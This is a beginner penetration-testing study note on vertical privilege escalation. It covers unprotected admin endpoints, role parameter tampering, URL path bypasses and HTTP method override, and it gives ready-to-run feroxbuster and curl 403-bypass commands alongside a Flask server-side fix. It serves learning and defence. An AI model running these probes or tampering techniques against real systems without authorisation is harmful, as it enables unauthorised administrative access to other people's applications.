---
tags: [vapt, access-control, beginner]
difficulty: beginner
module: "21 - Access Control"
topic: "21.01 Vertical Privilege Escalation"
portswigger_labs: ["Unprotected admin functionality", "User role controlled by request parameter"]
---

# 21.01 — Vertical Privilege Escalation

## What Is Privilege Escalation?

```
PRIVILEGE ESCALATION:
  Gaining more access/permissions than you're supposed to have
  
  VERTICAL: Going UP the privilege hierarchy
  Regular user → Admin → Super Admin → Root
  
  HORIZONTAL: Accessing OTHER users' data at SAME privilege level
  User A → accessing User B's data
  (Covered in note 21.02)
  
  MOST IMPACTFUL:
  Regular user → Admin = access to all users' data, settings, etc.
```

---

## Attack 1: Unprotected Admin Endpoints

```
SOME APPS HIDE ADMIN PAGES BUT DON'T PROTECT THEM:
  "Security through obscurity" — just don't link to it!
  
  Admin panel at: /admin
  No link to it in the UI for regular users
  But: no server-side auth check either!
  
  FINDING UNPROTECTED ENDPOINTS:
  1. Brute force with SecLists:
     feroxbuster -u https://target.com -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
     
  2. Check robots.txt (often reveals hidden paths):
     curl https://target.com/robots.txt
     # Disallow: /admin → they're hiding it but listing it!
     
  3. Check JS source for admin routes:
     grep -r "admin\|panel\|dashboard" site.js
     
  4. Check sitemap.xml:
     curl https://target.com/sitemap.xml
     
  5. Google dork:
     site:target.com inurl:admin
```

---

## Attack 2: Role Parameter Manipulation

```
SOME APPS PASS ROLE IN REQUEST:
  
  Cookie: role=user → what if I change it to role=admin?
  
  POST /update-profile
  role=user&name=John
  
  Change to:
  role=admin&name=John
  
  → If server trusts client-supplied role → escalated!
  
  LOOK FOR:
  - role, user_role, usertype in cookies
  - role, admin, isAdmin in POST body or query params
  - level, tier, permission in request
  
  ALSO CHECK:
  - Hidden form fields: <input type="hidden" name="role" value="user">
  - Local storage: role, permissions
  - JWT payload: role claim (see JWT module)
```

---

## Attack 3: URL-Based Access Control

```
URL REWRITING ACCESS CONTROL:
  Some apps check URL path to determine access:
  
  /user/profile → allowed for all
  /admin/panel  → check if admin
  
  BUT: bypasses possible:
  /ADMIN/panel     (case mismatch)
  /admin/panel/    (trailing slash)
  /admin%2fpanel   (URL encoding)
  /admin//panel    (double slash)
  /./admin/panel   (path traversal)
  
  If server normalizes URL after access check → bypass!
```

---

## Attack 4: HTTP Method Override

```
SOME APPS ONLY CHECK POST ON ADMIN ACTIONS:
  POST /admin/delete-user → checks for admin
  GET /admin/delete-user  → no check? → bypass!
  
  ALSO:
  X-HTTP-Method-Override: DELETE
  _method=DELETE (form field)
  
  → Server-side changes HTTP method based on header/param
  → Bypasses method-specific access checks
```

---

## Testing Methodology

```bash
# STEP 1: FIND ADMIN/HIGH-PRIVILEGE ENDPOINTS:
feroxbuster -u https://target.com \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,asp,aspx,jsp \
  --status-codes 200,301,302,403
# Note: 403 Forbidden is interesting! Endpoint exists but blocked → test bypass!

# STEP 2: CHECK ROBOTS.TXT:
curl -s https://target.com/robots.txt

# STEP 3: CHECK FOR ROLE PARAMETERS:
# Look in Burp HTTP history → find role/admin/level params
# Try modifying each value

# STEP 4: TEST 403 BYPASS TECHNIQUES:
# For each 403 endpoint, try:
TARGET="https://target.com/admin"
curl -s -o /dev/null -w "%{http_code}" $TARGET            # baseline 403
curl -s -o /dev/null -w "%{http_code}" ${TARGET}/         # trailing slash
curl -s -o /dev/null -w "%{http_code}" ${TARGET}//        # double slash
curl -s -o /dev/null -w "%{http_code}" /${TARGET^^}       # uppercase
curl -s -o /dev/null -w "%{http_code}" $TARGET -H "X-Original-URL: /admin"
curl -s -o /dev/null -w "%{http_code}" $TARGET -H "X-Rewrite-URL: /admin"
curl -s -o /dev/null -w "%{http_code}" $TARGET -H "X-Custom-IP-Authorization: 127.0.0.1"

# STEP 5: TEST PARAMETER TAMPERING:
# In Burp, intercept any request → add/modify:
# ?admin=true, ?role=admin, ?isAdmin=1
# POST body: admin=true, role=admin
# Cookie: role=admin
```

---

## Fix

```
CORRECT ACCESS CONTROL IMPLEMENTATION:

NEVER TRUST CLIENT FOR ROLE:
  ✗ if (request.params.role == 'admin'): grant_access()
  ✓ if (db.get_user(session.user_id).role == 'admin'): grant_access()

SERVER-SIDE CHECK ON EVERY REQUEST:
  # Python decorator:
  from functools import wraps
  from flask import session, abort
  
  def require_admin(f):
      @wraps(f)
      def decorated(*args, **kwargs):
          user_id = session.get('user_id')
          if not user_id:
              abort(401)  # not logged in
          user = db.get_user(user_id)
          if user.role != 'admin':
              abort(403)  # not admin
          return f(*args, **kwargs)
      return decorated
  
  @app.route('/admin/users')
  @require_admin
  def admin_users():
      return render_template('admin/users.html', users=db.get_all_users())

PRINCIPLE OF LEAST PRIVILEGE:
  Default: deny all
  Explicitly allow specific roles access to specific resources
  Never "hide" admin endpoints without also protecting them
```

---

## Related Notes
- [[02 - Horizontal Privilege Escalation]] — accessing other users' data
- [[03 - IDOR — Insecure Direct Object Reference]] — object-level access control
- [[12 - Parameter Tampering (role=admin, isAdmin=true)]] — parameter-based escalation
- [[20 - Defense — Server-Side Authorization, Object-Level Checks]] — full fix
